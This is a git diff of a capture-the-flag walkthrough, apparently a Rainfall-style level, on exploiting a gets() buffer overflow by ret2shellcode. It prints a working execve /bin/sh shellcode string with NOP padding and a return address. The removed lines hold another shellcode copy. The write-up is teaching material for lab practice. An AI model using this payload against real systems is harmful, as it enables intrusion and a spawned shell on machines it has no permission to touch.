@@ -35,7 +35,7 @@ int main(void)
 }
 ```
 
-Let's focus on the `p` function. It reads input using the `gets` function, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes read.
+Let's focus on the `p` function. It reads input using the `gets` function, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes read. This will allow us to overflow the buffer and overwrite the return address of the `p` function.
 
 Let's analyze the stack layout of our program:
 ```bash
@@ -70,9 +70,7 @@ Anything written beyond those 80 bytes will be treated as an address (only the 4
 There's different ways to solve this challenge, we'll see two of them. First with a ret2shellcode and then the ret2libc way.
 
 ### Ret2Shellcode
-We opt for a shellcode designed to spawn a shell. This shellcode, taken from the [Exploit Database](https://www.exploit-db.com/exploits/41757), is compact and effective for our purpose:
-
-`\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`
+Check the [level1's walkthrough](../level1/walkthrough.md#ret2shellcode) for an explanation of the ret2shellcode technique.
 
 To redirect the execution, after the buffer overflow, we need an address. We use `ltrace` to find that `strdup` returns to `0x0804a008`.
 
@@ -90,9 +88,9 @@ shellcode + padding + address of shellcode
 Alternatively, you could place the padding before the shellcode, using NOPs.
 
 "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\x04\xa0\x08"[::-1]
+```
 
 The padding is 80 - 21 because the shellcode is 21 bytes long.
-```
 
 Alright let's try it:
 ```bash
